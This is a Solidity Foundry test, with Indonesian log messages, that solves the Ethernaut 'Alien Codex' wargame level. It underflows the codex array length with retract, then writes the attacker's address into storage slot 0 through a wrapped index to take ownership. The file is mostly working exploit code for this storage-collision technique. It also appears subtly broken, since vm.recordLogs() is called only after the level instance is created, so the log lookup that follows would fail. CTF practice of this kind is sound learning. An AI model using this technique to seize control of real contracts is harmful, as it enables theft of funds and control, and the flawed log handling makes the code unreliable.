// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
    function owner() external view returns (address);
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautAlienCodexTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x0BC04aa6aaC163A6B3667636D798FA053D43BD11;

    function testLevel19_AlienCodex() public {
        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);
        vm.startPrank(hacker);

        ethernaut.createLevelInstance(levelFactory);
        
        vm.recordLogs(); 
        Vm.Log[] memory entries = vm.getRecordedLogs();

        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        console.log("Alien Codex Address:", levelAddr);

        IAlienCodex target = IAlienCodex(levelAddr);

        target.makeContact();

        target.retract();
        bytes32 arrayStartSlot = keccak256(abi.encode(1));
        
        uint256 indexToSlot0;
        unchecked {
            indexToSlot0 = 0 - uint256(arrayStartSlot);
        }
        
        console.log("Index menuju Slot 0:", indexToSlot0);

        bytes32 myAddressInBytes = bytes32(uint256(uint160(hacker)));
        target.revise(indexToSlot0, myAddressInBytes);

        address newOwner = target.owner();
        console.log("Owner sekarang:", newOwner);
        assertEq(newOwner, hacker);

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}
